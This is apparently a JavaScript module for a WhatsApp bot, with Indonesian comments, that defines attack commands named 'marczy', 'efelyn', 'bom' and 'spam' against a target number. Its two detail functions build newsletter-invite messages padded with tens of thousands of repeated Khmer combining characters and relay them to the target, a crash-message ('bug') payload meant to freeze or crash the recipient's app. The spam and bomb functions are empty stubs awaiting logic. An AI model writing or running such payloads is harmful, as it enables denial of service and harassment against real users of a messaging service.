({
  // --- PINTU UTAMA UNTUK TOMBOL ---

  marczy: async function(target, sock) {
    console.log(`[PROCESS] Executing Marczy Combo on: ${target}`);
    await this.func1(target, sock); // Panggil Logika 1
    await this.delay(500);            // Jeda 0.5 detik
    await this.func2(target, sock); // Panggil Logika 2
  },

  efelyn: async function(target, sock) {
    console.log(`[PROCESS] Executing Efelyn on: ${target}`);
    // Contoh logika sederhana
    await sock.sendMessage(target, { text: "⚡ Efelyn Bug Activated" });
  },

  bom: async function(target, sock) {
    console.log(`[PROCESS] Executing Bom on: ${target}`);
    // Masukkan logika bom kamu di sini
  },

  spam: async function(target, sock) {
    console.log(`[PROCESS] Executing Spam on: ${target}`);
    // Masukkan logika spam kamu di sini
  },

  // --- LOGIKA DETAIL (FUNCTION TERPISAH) ---

  func1: async function(target, sock) {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "☣PIW PEW☣" + "ោ៝".repeat(75000),
        caption: "Hi ./MarczyKill" + "ោ៝".repeat(70000),
        inviteExpiration: "999999999",
      },
    };
    await sock.relayMessage(target, msg, { participant: { jid: target }, messageId: null });
  },
    
func2: async function(target, sock) {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "☣PIW PEW☣" + "ោ៝".repeat(75000),
        caption: "Hi ./MarczyKill" + "ោ៝".repeat(70000),
        inviteExpiration: "999999999",
      },
    };
    await sock.relayMessage(target, msg, { participant: { jid: target }, messageId: null });
  },


    
  // --- FUNGSI PENDUKUNG ---
  delay: (ms) => new Promise(resolve => setTimeout(resolve, ms))
})
